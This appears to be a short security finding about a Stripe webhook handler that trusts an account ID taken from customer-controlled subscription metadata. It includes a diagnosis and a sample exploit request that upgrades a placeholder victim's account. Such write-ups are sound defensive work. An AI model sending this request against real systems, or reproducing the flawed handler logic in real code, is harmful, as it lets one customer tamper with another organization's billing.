diagnosis: Although the Stripe webhook payload signature is strictly verified using STRIPE_WEBHOOK_SECRET, the handler updates the subscription tier for target_account_id taken directly from the client-controllable subscription metadata dictionary. A malicious customer can set account_id in their own checkout session metadata to any victim organization's account ID and upgrade or cancel that victim's account.
exploit_request:
POST /api/v1/webhooks/stripe HTTP/1.1
Host: api.example.com
Stripe-Signature: t=1614552222,v1=valid_stripe_signature_from_attacker_checkout
Content-Type: application/json

{"id": "evt_test_123", "type": "customer.subscription.updated", "data": {"object": {"id": "sub_attacker_99", "customer": "cus_attacker_55", "status": "active", "items": {"data": [{"price": {"lookup_key": "enterprise_tier"}}]}, "metadata": {"account_id": "acc_victim_corp_001"}}}}
